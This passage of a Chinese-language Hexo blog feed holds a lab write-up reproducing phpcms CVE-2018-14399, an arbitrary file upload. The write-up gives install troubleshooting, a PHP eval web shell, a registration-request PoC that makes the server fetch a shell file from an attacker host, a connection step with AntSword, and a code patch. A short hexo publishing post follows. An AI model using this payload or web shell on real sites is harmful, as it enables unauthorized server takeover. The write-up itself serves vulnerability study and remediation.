：跳转到行尾</span><br></pre></td></tr></table></figure><p>————————————————<br>版权声明：本文为CSDN博主「一&amp;粟」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/D_huili/article/details/125301376">https://blog.csdn.net/D_huili/article/details/125301376</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>(CVE-2018-14399)</title>
    <link href="http://example.com/2023/03/29/phpcms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(CVE-2018-14399)/"/>
    <id>http://example.com/2023/03/29/phpcms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(CVE-2018-14399)/</id>
    <published>2023-03-28T18:33:34.000Z</published>
    <updated>2023-03-28T18:53:25.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-下载问题"><a href="#1-下载问题" class="headerlink" title="1.下载问题"></a>1.下载问题</h2><h4 id="1-dns解析不正确"><a href="#1-dns解析不正确" class="headerlink" title="(1) dns解析不正确"></a>(1) dns解析不正确</h4><p>phpcms安装时提示dns错误怎么解决目前因为phpcms官网停止解析后，很多人安装phpcms v9出现如下错误：这是因为检测dns解析的域名是phpcms官网的域名，官网域名停止解析后肯定检测<a href="http://www.if98.com/tag/%E5%A4%B1%E8%B4%A5">失败</a>。解决方法如下：打开&#x2F;install&#x2F;install.php文件，49行或者<a href="http://www.if98.com/tag/%E6%90%9C%E7%B4%A2">搜索</a>$PHP_DNS：里面<a href="http://www.phpcms.cn域名改成你正在安装v9的域名,或者改成www.baidu.com,不需要带协议,结尾不要带斜杠然后就可以了./">www.phpcms.cn域名改成你正在安装V9的域名，或者改成www.baidu.com，不需要带协议，结尾不要带斜杠然后就可以了。</a></p><h4 id="2-目录文件全不可写"><a href="#2-目录文件全不可写" class="headerlink" title="(2) 目录文件全不可写"></a>(2) 目录文件全不可写</h4><p>分析原因：</p><p>可能是一些权限问题</p><p>解决方法参考：</p><p><a href="https://blog.csdn.net/weixin_26802933/article/details/116515155">https://blog.csdn.net/weixin_26802933/article/details/116515155</a></p><p>1 将&#x2F;var&#x2F;www&#x2F;html&#x2F;phpcms目录所属用户和组修改为apache[root@localhost html]#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R apache:apache phpcms/</span><br></pre></td></tr></table></figure><p>2 将&#x2F;var&#x2F;www&#x2F;html&#x2F;phpcms目录下所有文件权限设置644，目录权限设置为755[root@localhost html]#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find phpcms/* -type f -exec chmod 644 &#123;&#125; \;</span><br><span class="line">find phpcms/* -type d -exec chmod 755 &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>3 查看&#x2F;var&#x2F;www&#x2F;html&#x2F;phpcms下目录和文件权限信息[root@localhost html]#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -lhd</span><br><span class="line">ls -lh</span><br></pre></td></tr></table></figure><h4 id="（3）phpsso-server-x2F-uploadfile-x2F-仍然不可写"><a href="#（3）phpsso-server-x2F-uploadfile-x2F-仍然不可写" class="headerlink" title="（3）phpsso_server&#x2F;uploadfile&#x2F;仍然不可写"></a>（3）phpsso_server&#x2F;uploadfile&#x2F;仍然不可写</h4><p>我遇到这个问题查询了很多文章，最后得出的结论竟然是phpsso_server这个文件夹下没有uploadfile这个文件夹。新建一个uploadfile文件夹就好了</p><h2 id="2-漏洞复现步骤"><a href="#2-漏洞复现步骤" class="headerlink" title="2.漏洞复现步骤"></a>2.漏洞复现步骤</h2><h4 id="（1）浏览器访问前台，点击注册"><a href="#（1）浏览器访问前台，点击注册" class="headerlink" title="（1）浏览器访问前台，点击注册"></a>（1）浏览器访问前台，点击注册</h4><h4 id="（2）提交时抓包，发送到repeater重放器中"><a href="#（2）提交时抓包，发送到repeater重放器中" class="headerlink" title="（2）提交时抓包，发送到repeater重放器中"></a>（2）提交时抓包，发送到repeater重放器中</h4><h4 id="（3）我在centos7系统中开启的web服务，在web服务的根目录下创建一个txt文件"><a href="#（3）我在centos7系统中开启的web服务，在web服务的根目录下创建一个txt文件" class="headerlink" title="（3）我在centos7系统中开启的web服务，在web服务的根目录下创建一个txt文件"></a>（3）我在centos7系统中开启的web服务，在web服务的根目录下创建一个txt文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim phpinfo.txt</span><br></pre></td></tr></table></figure><p>在文件里面写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();eval($_POSTP[cmd]);?&gt;</span><br></pre></td></tr></table></figure><h4 id="（4）构造POC"><a href="#（4）构造POC" class="headerlink" title="（4）构造POC:"></a>（4）构造POC:</h4><p><strong>需要注意:</strong> 在repeater里测试时每发送一次都要修改username，password和email字段值,保证不能重复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=2l344&amp;password=12333l4612&amp;email=1233l346@qq.com&amp;info[content]=&lt;img src=http://192.168.199.135/phpinfo.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure><p>将抓包划红线的内容替换成我们写的POC,提交POC</p><p>发现提交后会在返回包里显示上传路径</p><p>（5）复制地址用蚁剑连接</p><h2 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h2><p>（1）临时修复方案可以考虑禁用<code>uploadfile</code>目录下的PHP执行权限。</p><p>（2）找到这个目录文件 phpcms&#x2F;libs&#x2F;classes&#x2F;attachment.class.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim attachment.class.php</span><br></pre></td></tr></table></figure><p>找到下面这两行代码</p><p>在168行下面添加</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="variable">$ext</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line"> <span class="variable">$arryfilename</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$ext</span>);</span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$arryfilename</span> <span class="keyword">as</span> <span class="variable">$n</span>=&gt;<span class="variable">$fn</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$fn</span>)&#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="variable">$fn</span>;</span><br><span class="line">             <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-下载问题&quot;&gt;&lt;a href=&quot;#1-下载问题&quot; class=&quot;headerlink&quot; title=&quot;1.下载问题&quot;&gt;&lt;/a&gt;1.下载问题&lt;/h2&gt;&lt;h4 id=&quot;1-dns解析不正确&quot;&gt;&lt;a href=&quot;#1-dns解析不正确&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>写博客、发布博客</title>
    <link href="http://example.com/2023/03/29/%E5%86%99%E5%8D%9A%E5%AE%A2%E3%80%81%E5%8F%91%E5%B8%83%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/2023/03/29/%E5%86%99%E5%8D%9A%E5%AE%A2%E3%80%81%E5%8F%91%E5%B8%83%E5%8D%9A%E5%AE%A2/</id>
    <published>2023-03-28T18:23:15.772Z</published>
    <updated>2023-01-29T02:48:45.851Z</updated>
    
    <content type="html"><![CDATA[<p>首先，在Blog文件夹右键打开Git Bash Here<br>新建一篇博客，执行下面的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post &quot;article title&quot;</span><br></pre></td></tr></table></figure><p>这时候在我的 电脑的目录下 F:\hexo\source_posts 将会看到 article title.md 文件</p><p>用MarDown编辑器打开就可以编辑文章了。文章编辑好之后，运行生成、部署命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g // 生成</span><br><span class="line">hexo s //在本地部署</span><br><span class="line">hexo d // 部署</span><br></pre></td></tr></table></figure><p>当然你也可以执行下面的命令，相当于上面两条命令的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d -g #在部署前先生成</span><br></pre></td></tr></table></figure><p>然后访问域名就可以访问我们的博客了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先，在Blog文件夹右键打开Git Bash Here&lt;br&gt;新建一篇博客，执行下面的命令：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    
  </entry>
  
</feed>
